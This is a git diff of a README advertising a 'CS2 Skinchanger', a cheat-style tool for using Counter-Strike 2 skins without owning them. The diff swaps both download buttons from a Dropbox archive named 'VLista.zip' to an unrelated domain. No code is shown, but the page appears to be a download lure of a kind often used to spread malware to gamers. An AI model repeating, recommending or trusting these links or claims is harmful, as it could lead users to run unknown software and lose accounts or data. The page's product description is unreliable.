@@ -2,7 +2,7 @@
 
 CS2 Skinchanger is a lightweight and easy-to-use tool that allows players to apply any weapon, knife, glove, or sticker skin in Counter-Strike 2 without owning it on their Steam inventory.
 
-[![Download CS2 SkinChanger](https://img.shields.io/badge/Download-CS2%20SkinChanger-blueviolet)](https://www.dropbox.com/scl/fi/4jhw12dp0y73wl4kewupt/VLista.zip?rlkey=t91v97hu5inrue164tgx7xi0a&st=f8sggpyf&dl=1)
+[![Download CS2 SkinChanger](https://img.shields.io/badge/Download-CS2%20SkinChanger-blueviolet)](https://yogarouen.eu/)
 
 ## Features
 - ✅ Real-time skin changing
@@ -20,4 +20,4 @@ CS2 Skinchanger is a lightweight and easy-to-use tool that allows players to app
 
 Enjoy your new look in CS2! 🎯
 
-[![Download CS2 SkinChanger](https://img.shields.io/badge/Download-CS2%20SkinChanger-blueviolet)](https://www.dropbox.com/scl/fi/4jhw12dp0y73wl4kewupt/VLista.zip?rlkey=t91v97hu5inrue164tgx7xi0a&st=f8sggpyf&dl=1)
+[![Download CS2 SkinChanger](https://img.shields.io/badge/Download-CS2%20SkinChanger-blueviolet)](https://yogarouen.eu/)
